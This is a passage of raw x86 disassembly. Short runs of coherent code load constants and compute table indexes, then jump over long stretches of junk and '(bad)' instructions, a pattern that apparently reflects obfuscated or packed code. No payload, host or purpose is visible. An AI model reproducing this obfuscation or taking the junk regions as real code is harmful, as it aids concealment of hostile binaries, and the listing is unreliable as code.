  410978:	fidiv  WORD PTR [eax+0x1e079778]
  41097e:	inc    ebx
  41097f:	mov    dh,cl
  410981:	jo     0x4109e7
  410983:	push   0x71
  410985:	cs mov bl,al
  410988:	iret   
  410989:	nop
  41098a:	jmp    0x410965
  41098c:	scas   al,BYTE PTR es:[edi]
  41098d:	xor    eax,0xbe5f1e24
  410992:	cwde   
  410993:	push   esi
  410994:	or     BYTE PTR [edx-0x1e],0xbe
  410998:	pop    esi
  410999:	sbb    cl,ch
  41099b:	adc    bh,BYTE PTR ds:0x4d22c28c
  4109a1:	inc    ebx
  4109a2:	sbb    eax,0xf0a1bd8d
  4109a7:	sub    al,0x95
  4109a9:	stos   DWORD PTR es:[edi],eax
  4109aa:	dec    edi
  4109ab:	pushf  
  4109ac:	in     eax,0x10
  4109ae:	dec    ecx
  4109af:	mov    BYTE PTR ds:0xdf99ed7f,0x1f
  4109b6:	jecxz  0x41098f
  4109b8:	push   eax
  4109b9:	xchg   ecx,eax
  4109ba:	ss or  eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x422049
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x422049
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0xb071b856
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    cl,cl
  410a7d:	pop    edi
  410a7e:	jno    0x410aaf
  410a80:	push   ss
  410a81:	pusha  
  410a82:	mov    bh,0x29
  410a84:	jecxz  0x410a11
  410a86:	idiv   DWORD PTR [edi]
  410a88:	cli    
  410a89:	mov    dh,0xe3
  410a8b:	pop    ecx
  410a8c:	nop
  410a8d:	xor    BYTE PTR [esi],al
  410a8f:	sbb    al,0x90
  410a91:	xor    eax,0xc21aad3a
  410a96:	inc    edx
  410a97:	xlat   BYTE PTR ds:[ebx]
  410a98:	mov    bh,0xed
  410a9a:	mov    ebp,0x976932cc
  410a9f:	jb     0x410ae0
  410aa1:	pop    es
  410aa2:	mov    ecx,0x41338e62
  410aa7:	lahf   
  410aa8:	and    BYTE PTR [ecx-0x33b3b63d],dl
  410aae:	pusha  
  410aaf:	enter  0x5222,0x5c
  410ab3:	inc    esp
  410ab4:	(bad)  
  410ab5:	nop
  410ab6:	test   cl,cl
  410ab8:	sbb    al,0xeb
  410aba:	mov    bl,0x5a
  410abc:	out    0xb7,al
  410abe:	jne    0x410a78
  410ac0:	push   edx
  410ac1:	imul   esi,edx,0xf717aa4b
  410ac7:	cli    
  410ac8:	or     ebx,DWORD PTR ds:0x3f56888a
  410ace:	jge    0x410b40
  410ad0:	out    dx,al
  410ad1:	fcmovnb st,st(4)
  410ad3:	mov    ebp,0xd19b9b01
  410ad8:	dec    esp
  410ad9:	or     al,0x64
  410adb:	jns    0x410b19
  410add:	adc    ah,BYTE PTR [ecx]
  410adf:	mov    ds:0xc27a702a,al
  410ae4:	fisubr DWORD PTR ds:0x7ffcc78f
  410aea:	jnp    0x410b50
  410aec:	pushf  
  410aed:	daa    
  410aee:	in     eax,0xed
  410af0:	sti    
  410af1:	imul   esi,DWORD PTR [eax-0x37c7583e],0x21
  410af8:	daa    
  410af9:	fist   WORD PTR [ecx-0x539eb6ae]
  410aff:	add    bl,BYTE PTR [ebx+0x17]
  410b02:	repnz arpl si,dx
  410b05:	mov    eax,0x549ef3b5
  410b0a:	and    ch,BYTE PTR [eax-0x66]
  410b0d:	and    dh,BYTE PTR [edx]
  410b0f:	inc    ebp
  410b10:	or     dl,ah
  410b12:	rol    BYTE PTR ds:0x852c71a5,0xf5
  410b19:	xor    bl,bl
  410b1b:	adc    eax,ebx
  410b1d:	inc    esi
  410b1e:	fwait
  410b1f:	rol    BYTE PTR [ebx-0x48],1
  410b22:	cld    
  410b23:	mov    cl,0x4f
  410b25:	test   eax,0xe3b93dae
  410b2a:	(bad)  
  410b2b:	vmaxps ymm5,ymm3,YMMWORD PTR [ecx-0x14]
  410b30:	sub    al,0xde
  410b32:	es jnp 0x410abf
  410b35:	outs   dx,DWORD PTR ds:[esi]
  410b36:	pop    es
  410b37:	pop    esp
  410b38:	retf   
  410b39:	ds aas 
  410b3b:	or     ebx,DWORD PTR [esp+edi*8-0x6c24aa34]
  410b42:	add    esi,DWORD PTR [eax]
  410b44:	jb     0x410b78
  410b46:	jle    0x410b62
  410b48:	out    dx,eax
  410b49:	outs   dx,DWORD PTR ds:[esi]
  410b4a:	in     al,dx
  410b4b:	push   esi
  410b4c:	adc    eax,0x6db154cd
  410b51:	xchg   esi,eax
  410b52:	adc    al,0xf8
  410b54:	cwde   
  410b55:	xor    bh,bh
  410b57:	in     eax,0x42
  410b59:	push   edx
  410b5a:	lock push 0x33
  410b5d:	mov    ecx,0x39e09662
  410b62:	pop    esi
  410b63:	cmp    DWORD PTR [ecx-0x2f0a62a4],ebx
  410b69:	xor    esp,DWORD PTR [eax-0x32]
  410b6c:	or     al,0xc3
  410b6e:	mov    ecx,0xca56e7a4
  410b73:	jmp    0x410b77
  410b75:	inc    esp
  410b76:	mov    dh,0xd9
  410b78:	sbb    esp,edx
  410b7a:	(bad)  
  410b7b:	aad    0x58
  410b7d:	xchg   esi,eax
  410b7e:	cmp    DWORD PTR [esi+ebp*8],eax
  410b81:	xchg   ebx,eax
  410b82:	(bad)  
  410b83:	and    al,0x3b
  410b85:	es jo  0x410bf7
  410b88:	out    0xd5,eax
  410b8a:	or     DWORD PTR [eax-0x43],0xea8eea86
  410b91:	ss jl  0x410b7e
  410b94:	cmp    DWORD PTR [ecx],0x62
  410b97:	ins    BYTE PTR es:[di],dx
  410b99:	sbb    al,0x2e
  410b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b9c:	mov    dl,0x88
  410b9e:	pop    DWORD PTR [eax-0xd233992]
  410ba4:	inc    edx
  410ba5:	imul   DWORD PTR [ebp-0xf]
  410ba8:	dec    edx
  410ba9:	mov    bh,bh
  410bab:	mov    ah,0x21
  410bad:	sbb    BYTE PTR [eax],cl
  410baf:	(bad)  
  410bb0:	mov    edx,0xcde57bd0
  410bb5:	or     dl,al
  410bb7:	int    0x6b
  410bb9:	shr    DWORD PTR [ecx-0x4944cdc8],1
  410bbf:	imul   esi,ebp,0x22
  410bc2:	inc    edx
  410bc3:	xchg   ebx,edi
  410bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bc6:	jns    0x410be0
  410bc8:	pop    ss
  410bc9:	fbstp  TBYTE PTR [ebx+ecx*1-0x1d25b7c8]
  410bd0:	add    al,0xc0
  410bd2:	pop    esi
  410bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd4:	rol    cl,0x2f
  410bd7:	fimul  DWORD PTR [ebx]
  410bd9:	fst    QWORD PTR [ebp+eax*4+0x3]
  410bdd:	loope  0x410c03
  410bdf:	les    ecx,FWORD PTR [edi-0xaac7eb4]
  410be5:	push   ebx
  410be6:	xchg   ebx,eax
  410be7:	adc    esi,0xffffff98
  410bea:	push   edi
  410beb:	ins    DWORD PTR es:[edi],dx
  410bec:	inc    ecx
  410bed:	ss ret 0xaf34
  410bf1:	jo     0x410bac
  410bf3:	inc    edx
  410bf4:	mov    eax,ds:0x7a7e4a5
  410bf9:	add    DWORD PTR [edx+0x74f080d2],edx
  410bff:	mov    gs,WORD PTR [eax+eiz*2-0x7a33f9b9]
  410c06:	stc    
  410c07:	jecxz  0x410bb3
  410c09:	hlt    
  410c0a:	add    esi,DWORD PTR [eax-0x19]
  410c0d:	test   eax,0x79ce3af6
  410c12:	mov    ecx,0x4c8430a8
  410c17:	or     eax,0x402d9676
  410c1c:	cmp    eax,0x7da02413
  410c21:	pop    ebx
  410c22:	loopne 0x410bd3
  410c24:	stos   BYTE PTR es:[edi],al
  410c25:	addr16 cmp cl,dh
  410c28:	fldcw  WORD PTR [ecx-0x47]
  410c2b:	jb     0x410c3f
  410c2d:	(bad)  
  410c2e:	in     al,0x60
  410c30:	dec    esi
  410c31:	mov    BYTE PTR [ecx+0x28],ch
  410c34:	gs adc BYTE PTR ss:[ecx-0x1264dce1],ch
  410c3c:	mov    bl,0xdc
  410c3e:	mov    ch,0xd9
  410c40:	fbld   TBYTE PTR [ecx]
  410c42:	inc    edi
  410c43:	cli    
  410c44:	inc    ebp
  410c45:	xchg   bx,ax
  410c47:	or     edi,esp
  410c49:	(bad)  [ebp+0x16]
  410c4c:	inc    ecx
  410c4d:	xor    BYTE PTR ds:0x830b190e,bh
  410c53:	retf   0x2d17
  410c56:	jbe    0x410c8b
  410c58:	aam    0x2c
  410c5a:	in     eax,0x63
  410c5c:	push   ds
  410c5d:	jecxz  0x410cac
  410c5f:	fistp  QWORD PTR [eax]
  410c61:	jl     0x410cdd
  410c63:	mov    ds:0x770c53da,eax
  410c68:	add    DWORD PTR [esi+0x1c],0x45
  410c6c:	arpl   WORD PTR [esi],si
  410c6e:	jne    0x410ca9
  410c70:	dec    esi
  410c71:	jne    0x410c85
  410c73:	adc    al,0x1a
  410c75:	push   edi
  410c76:	aas    
  410c77:	mov    eax,0x9fda974
  410c7c:	inc    esi
  410c7d:	jmp    0x5af4:0xcd64d90a
  410c84:	xchg   esp,eax
  410c85:	push   ebp
  410c86:	cwde   
  410c87:	mov    cl,0xd8
  410c89:	fist   WORD PTR [eax]
  410c8b:	mov    esi,esp
  410c8d:	jle    0x410cfc
  410c8f:	ds xchg edi,eax
  410c91:	in     al,0x5
  410c93:	push   ds
  410c94:	popf   
  410c95:	(bad)  
  410c96:	fdiv   QWORD PTR [ecx+0x4ac795be]
  410c9c:	or     eax,0x456ede53
  410ca1:	test   cl,0xf6
  410ca4:	es push edi
  410ca6:	sar    BYTE PTR [edi],cl
  410ca8:	pop    ds
  410ca9:	fs dec edx
  410cab:	mov    dl,BYTE PTR [ecx]
  410cad:	adc    eax,0x7f3fd730
  410cb2:	adc    dl,bl
  410cb4:	jecxz  0x410c53
  410cb6:	mov    edx,0x8ab84d4f
  410cbb:	repz jo 0x410d1c
  410cbe:	xlat   BYTE PTR ds:[ebx]
  410cbf:	shl    BYTE PTR [esi],0x7f
  410cc2:	mov    eax,0x266de0d8
  410cc7:	ins    BYTE PTR es:[edi],dx
  410cc8:	mov    eax,0x6d2b2332
  410ccd:	ret    0x3c4a
  410cd0:	push   ebx
  410cd1:	dec    esi
  410cd2:	pop    edx
  410cd3:	mov    eax,ds:0xc75684f5
  410cd8:	outs   dx,DWORD PTR ds:[esi]
  410cd9:	(bad)  
  410cda:	or     eax,0xfb874ecb
  410cdf:	leave  
  410ce0:	inc    ebx
  410ce1:	out    dx,eax
  410ce2:	cmp    al,0x1e
  410ce4:	pop    es
  410ce5:	call   0xe6e8:0xca653f64
  410cec:	cmc    
  410ced:	test   BYTE PTR [edi-0x1e],dl
  410cf0:	mov    al,0xfb
  410cf2:	mov    ebx,0xa829f985
  410cf7:	jg     0x410c82
  410cf9:	sub    eax,0x2698abd6
  410cfe:	(bad)  
  410cff:	cmp    ebp,edx
  410d01:	ret    0x1a06
  410d04:	sub    esp,eax
  410d06:	nop
  410d07:	int3   
  410d08:	or     DWORD PTR [ecx-0x68afb201],0x8375be93
  410d12:	ret    0x65f4
  410d15:	sbb    eax,0x2598c813
  410d1a:	sbb    BYTE PTR [ebx+0x18],dl
  410d1d:	push   ebp
  410d1e:	stos   BYTE PTR es:[edi],al
  410d1f:	mov    esp,0x5492f7
  410d24:	call   0x85e8:0x9b177317
  410d2b:	scas   al,BYTE PTR es:[edi]
  410d2c:	std    
  410d2d:	clc    
  410d2e:	add    edx,DWORD PTR [esi]
  410d30:	xchg   esp,ebx
  410d32:	or     edi,edx
  410d34:	xor    dh,ah
  410d36:	fcomp  QWORD PTR [eax-0xe]
  410d39:	(bad)  
  410d3a:	xor    BYTE PTR [ebx*8+0x7d89c4fa],cl
  410d41:	cld    
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0x45
  410d65:	mov    dh,0xdd
  410d67:	jle    0x410dd6
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0x2163:0xe181814
  410d73:	stc    
  410d74:	div    DWORD PTR [esp+ecx*1]
  410d77:	ret    
  410d78:	hlt    
  410d79:	clc    
  410d7a:	pop    ss
  410d7b:	mov    edi,0xe5cb274b
  410d80:	xchg   esp,eax
  410d81:	scas   eax,DWORD PTR es:[edi]
  410d82:	in     al,dx
  410d83:	adc    al,0xb9
  410d85:	inc    edi
  410d86:	mov    eax,edi
  410d88:	outs   dx,BYTE PTR ds:[esi]
  410d89:	scas   al,BYTE PTR es:[edi]
  410d8a:	int    0xa9
  410d8c:	imul   sp,WORD PTR [ecx],0xb483
  410d91:	dec    DWORD PTR [edx-0x24ac6008]
  410d97:	inc    esp
  410d98:	inc    esp
  410d99:	(bad)  
  410d9a:	jnp    0x410d60
  410d9c:	dec    edi
  410d9d:	xor    bl,BYTE PTR [edx]
  410d9f:	lock push 0x18dc05f8
  410da5:	inc    ecx
  410da6:	dec    ebx
  410da7:	mov    al,es:0x5b1353e4
  410dad:	outs   dx,BYTE PTR ds:[esi]
  410dae:	stos   DWORD PTR es:[edi],eax
  410daf:	cmp    bl,BYTE PTR [edi-0xf]
  410db2:	sbb    eax,DWORD PTR [eax]
  410db4:	pusha  
  410db5:	mov    BYTE PTR [ebx+0x119604c9],0xd4
  410dbc:	cmp    DWORD PTR [esi],0x557cd76c
  410dc2:	or     BYTE PTR [ebp-0x33256815],0x40
  410dc9:	lds    edx,FWORD PTR [edi-0x7a2e72c3]
  410dcf:	push   esp
  410dd0:	add    esp,esi
  410dd2:	test   al,0x94
  410dd4:	pop    esp
  410dd5:	jp     0x410d96
  410dd7:	test   eax,0x95969217
  410ddc:	int3   
  410ddd:	loop   0x410d83
  410ddf:	sub    al,0x4a
  410de1:	imul   BYTE PTR [esi-0xf]
  410de4:	push   ecx
  410de5:	add    ecx,esi
  410de7:	jecxz  0x410dc7
  410de9:	lea    ebp,[ebp-0x2dbce382]
  410def:	scas   eax,DWORD PTR es:[edi]
  410df0:	push   cs
  410df1:	loope  0x410e4d
  410df3:	cli    
  410df4:	jne    0x410dbf
  410df6:	test   eax,0xef2fc475
  410dfb:	sub    DWORD PTR [ebx],ebx
  410dfd:	loop   0x410dd4
  410dff:	pop    edx
  410e00:	push   esi
  410e01:	pop    edx
  410e02:	int3   
  410e03:	test   al,0x48
  410e05:	push   ebp
  410e06:	inc    esi
  410e07:	dec    ecx
  410e08:	xchg   esi,eax
  410e09:	add    al,0xda
  410e0b:	inc    esi
  410e0c:	lods   eax,DWORD PTR ds:[esi]
  410e0d:	aad    0xeb
  410e0f:	aas    
  410e10:	mov    eax,ds:0x6c980a3
  410e15:	xor    BYTE PTR [esi+0x6e],ah
  410e18:	rcr    DWORD PTR ds:0x9f5ac6,0xac
  410e1f:	sub    edx,esp
  410e21:	aam    0x4a
  410e23:	pop    edi
  410e24:	and    eax,DWORD PTR [ebp-0x75c37c01]
  410e2a:	xchg   ecx,eax
  410e2b:	daa    
  410e2c:	out    dx,eax
  410e2d:	mov    eax,0xe8ae0411
  410e32:	adc    bh,bh
  410e34:	stos   BYTE PTR es:[edi],al
  410e35:	sbb    eax,0xec0107a3
  410e3a:	es jecxz 0x410e5a
  410e3d:	in     al,0x87
  410e3f:	enter  0xa63a,0xb7
  410e43:	sbb    BYTE PTR ds:0x449525f,bh
  410e49:	clc    
  410e4a:	adc    eax,0x83f1a235
  410e4f:	data16 add ch,BYTE PTR [esi-0x62b42b03]
  410e56:	aaa    
  410e57:	in     al,dx
  410e58:	imul   ebp,DWORD PTR [ebx+0x35b043e0],0xbf2a5b28
  410e62:	out    dx,al
  410e63:	or     esp,DWORD PTR [ebp+eiz*1+0x1a213db1]
  410e6a:	lahf   
  410e6b:	jecxz  0x410df6
  410e6d:	xor    eax,0xdec592ba
  410e72:	fs aaa 
  410e74:	fdiv   QWORD PTR [esi+0x3e]
  410e77:	add    al,0xbc
  410e79:	out    dx,eax
  410e7a:	(bad)  
  410e7b:	push   cs
  410e7c:	mov    cl,0xf8
  410e7e:	and    al,BYTE PTR [ecx+0x1]
  410e81:	jmp    0xd806bde3
  410e86:	inc    edi
  410e87:	sbb    DWORD PTR [edx+ebp*8+0x325e2023],edx
  410e8e:	lods   al,BYTE PTR ds:[esi]
  410e8f:	stos   DWORD PTR es:[edi],eax
  410e90:	scas   eax,DWORD PTR es:[edi]
  410e91:	pop    edi
  410e92:	sub    al,0xb3
  410e94:	adc    al,BYTE PTR [esi]
  410e96:	or     al,bl
  410e98:	xchg   DWORD PTR [edi+edi*8-0x73],esi
  410e9c:	mov    ?,eax
  410e9e:	fmul   QWORD PTR [ebp-0x21388371]
  410ea4:	pop    es
  410ea5:	dec    ebp
  410ea6:	fld    TBYTE PTR [edi]
  410ea8:	mov    edi,cs
  410eaa:	jne    0x410edf
  410eac:	cmp    DWORD PTR [ecx-0x1c],eax
  410eaf:	or     ecx,ebx
  410eb1:	je     0x410ef0
  410eb3:	add    DWORD PTR [ebp+0x35],ecx
  410eb6:	cmp    edi,edi
  410eb8:	(bad)  
  410eb9:	shl    BYTE PTR [ecx],0xe7
  410ebc:	and    al,0xfb
  410ebe:	lea    edi,[eax+0x764be55e]
  410ec4:	mov    ebp,0x1880e026
  410ec9:	dec    ecx
  410eca:	mov    ds:0xcb8bc14f,eax
  410ecf:	cli    
  410ed0:	outs   dx,DWORD PTR ds:[esi]
  410ed1:	jno    0x410ee0
  410ed3:	adc    DWORD PTR [edi-0x35],0x59e518ad
  410eda:	es aad 0x30
  410edd:	test   al,0x98
  410edf:	rcr    BYTE PTR ds:[ecx],0x9f
  410ee3:	fdivr  st(1),st
  410ee5:	popf   
  410ee6:	pop    es
  410ee7:	mov    cl,0xbb
  410ee9:	call   0xfcc0e24f
  410eee:	add    dl,BYTE PTR [esi]
  410ef0:	mov    esi,0x684a07a8
  410ef5:	jns    0x410ead
  410ef7:	(bad)  
  410ef8:	test   al,0x64
  410efa:	adc    cl,BYTE PTR [esi+0x5cdbf68e]
  410f00:	(bad)  
  410f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f02:	aas    
  410f03:	and    DWORD PTR [edx-0x8196fa7],eax
  410f09:	mov    ah,0xb9
  410f0b:	pop    cx
  410f0d:	sbb    al,0xa2
  410f0f:	lock dec ecx
  410f11:	or     eax,0x927c39ee
  410f16:	cmp    esp,edi
  410f18:	rol    BYTE PTR [ebx+0x54],cl
  410f1b:	dec    eax
  410f1c:	push   ds
  410f1d:	dec    eax
  410f1e:	xor    eax,0xaa84e950
  410f23:	push   ebx
  410f24:	retf   0x571d
  410f27:	jno    0x410edc
  410f29:	scas   eax,DWORD PTR es:[edi]
  410f2a:	jbe    0x410f8c
  410f2c:	xchg   edx,eax
  410f2d:	or     esi,DWORD PTR [ebx-0x773194df]
  410f33:	shl    ebx,1
  410f35:	add    ebp,DWORD PTR [eax-0x66]
  410f38:	mov    edx,0x8ff1baca
  410f3d:	adc    al,bh
  410f3f:	test   eax,0xdd755b16
  410f44:	mov    dl,0x3b
  410f46:	ss (bad) 
  410f48:	mov    edi,0xadb1b980
  410f4d:	inc    esi
  410f4e:	scas   eax,DWORD PTR es:[edi]
  410f4f:	test   al,0x8
  410f52:	pop    ebx
  410f53:	or     eax,0x641d0ed9
  410f58:	call   0xc513529c
  410f5d:	xchg   esp,eax
  410f5e:	aad    0x8f
  410f60:	inc    ecx
  410f61:	jl     0x410f06
  410f63:	aad    0x1c
  410f65:	push   esp
  410f66:	sbb    bh,0xd5
  410f69:	retf   
  410f6a:	repnz pop ecx
  410f6c:	enter  0xa246,0x0
  410f70:	xchg   ebx,eax
  410f71:	hlt    
  410f72:	push   cs
  410f73:	lahf   
  410f74:	xchg   edx,eax
  410f75:	dec    edi
  410f76:	lds    ebx,FWORD PTR [ecx+0x49a03c08]
  410f7c:	retf   0x66cb
  410f7f:	jmp    0xfb79:0x95736dab
  410f86:	les    eax,FWORD PTR [edi]
  410f88:	jmp    0xf3a9:0xff7903b6
  410f8f:	shr    esi,1
  410f91:	popa   
  410f92:	jle    0x410fd5
  410f94:	inc    edi
  410f95:	je     0x410f27
  410f97:	sbb    BYTE PTR [ebx+0x23],0x8a
  410f9b:	and    esp,DWORD PTR [edi-0x39]
  410f9e:	idiv   BYTE PTR [eax]
  410fa0:	fisub  WORD PTR [ecx-0x34d18050]
  410fa6:	(bad)  
  410fa7:	cld    
  410fa8:	pop    ebp
  410fa9:	mov    bl,0x1a
  410fab:	out    0x82,al
  410fad:	shr    BYTE PTR [edi],1
  410faf:	push   esi
  410fb0:	push   edi
  410fb1:	mov    ds:0x5c102bb8,eax
  410fb6:	(bad)  
  410fb7:	sbb    ebp,DWORD PTR [eax]
  410fb9:	scas   al,BYTE PTR es:[edi]
  410fba:	or     bh,BYTE PTR [ebx+0x31]
  410fbd:	sub    DWORD PTR [ebp+0x6a],0x59911f5a
  410fc4:	or     bh,BYTE PTR [ecx+eax*4]
  410fc7:	sbb    dl,0x40
  410fca:	loopne 0x410f7c
  410fcc:	(bad)  
  410fcd:	stos   BYTE PTR es:[edi],al
  410fce:	call   0x51ce:0x6e154b52
  410fd5:	push   eax
  410fd6:	(bad)  
  410fd7:	fstp   DWORD PTR [ecx]
  410fd9:	stos   DWORD PTR es:[edi],eax
  410fda:	jge    0x410f8b
  410fdc:	lea    ebp,[ebp-0x57]
  410fdf:	sar    DWORD PTR [ebx],1
  410fe1:	sub    DWORD PTR [eax],eax
  410fe3:	repnz jmp 0x25a8:0x20b337e6
  410feb:	dec    ebp
  410fec:	dec    edi
  410fed:	push   es
  410fee:	add    al,0x2d
  410ff0:	pushf  
  410ff1:	jb     0x410fdc
  410ff3:	dec    edx
  410ff4:	dec    ecx
  410ff5:	scas   al,BYTE PTR es:[edi]
  410ff6:	rcl    DWORD PTR [edi+0x2614a283],cl
  410ffc:	daa    
  410ffd:	cli    
  410ffe:	mov    esi,0x196aa4aa
  411003:	mov    eax,0xb99ba833
  411008:	sub    eax,0xdd78c17b
  41100d:	jmp    0x5b8:0x251b5928
  411014:	cmp    eax,DWORD PTR [eax]
  411016:	data16 fwait
  411018:	js     0x41100f
  41101a:	sub    dh,BYTE PTR [eax+0x18]
  41101d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41101e:	ins    DWORD PTR es:[edi],dx
  41101f:	das    
  411020:	mov    ebp,0x822af9e4
  411025:	lods   al,BYTE PTR ds:[esi]
  411026:	(bad)  
  411027:	repz cmp BYTE PTR ds:[ecx],0x4a
  41102c:	loop   0x411075
  41102e:	mov    ch,0x15
  411030:	mov    esi,0x4d8bd2fa
  411035:	cld    
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax+0x6e]
  4111f1:	mov    al,ds:0x7ceebcd5
  4111f6:	sbb    BYTE PTR [eax],bl
  4111f8:	jno    0x41120e
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	sub    BYTE PTR [edi],bh
  4111fe:	add    ecx,esp
  411200:	aad    0x3c
  411202:	sub    al,0x20
  411204:	sub    DWORD PTR [edx+0x54],edx
  411207:	mov    esp,0xdd4e85ad
  41120c:	in     al,0x57
  41120e:	or     eax,0x2bb1e8ae
  411213:	out    dx,al
  411214:	(bad)  
  411215:	or     dh,BYTE PTR [edi+0x20dbd82e]
  41121b:	lds    ebx,FWORD PTR [esi]
  41121d:	jns    0x411292
  41121f:	mov    cl,0xd4
  411221:	imul   edi,ebx,0xffffffb8
